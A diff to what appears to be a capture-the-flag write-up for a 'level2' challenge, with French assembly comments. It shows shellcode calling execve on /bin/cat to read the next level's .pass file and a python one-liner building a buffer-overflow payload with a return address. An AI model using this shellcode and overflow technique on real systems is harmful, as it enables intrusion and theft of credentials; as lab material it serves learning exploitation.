@@ -29,7 +29,7 @@ push   $0x7461632F ; /cat
 push   $0x6E69622F ; /bin
 mov    %esp,%ebx   ; pointeur vers path
 push   %eax        ; NULL
-push   %ecx        ; "/home/user/level2/.pass"
+push   %ecx        ; "/home/user/level3/.pass"
 push   %ebx        ; "/bin/cat"
 mov    %esp,%ecx   ; pointeur vers tableau d'args
 mov    $0xb,%al    ; eax = 0x0b => execve
@@ -61,4 +61,4 @@ Now we extract the address returned by `strdup` with GDB. We calculate the offse
 ```bash
 python -c 'print "\x31\xd2\x31\xc0\x52\x68\x70\x61\x73\x73\x68\x33\x2f\x2f\x2e\x68\x65\x76\x65\x6c\x68\x65\x72\x2f\x6c\x68\x65\x2f\x75\x73\x68\x2f\x68\x6f\x6d\x89\xe1\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x51\x53\x89\xe1\xb0\x0b\xcd\x80" + (80-59)*"\x00" + "\x08\x04\xa0\x08"[::-1]'
 ```
-Just pipe this in level2 and we get the flag! Tadaaaaaa!
+Just pipe this in `./level2` and we get the flag! Tadaaaaaa!
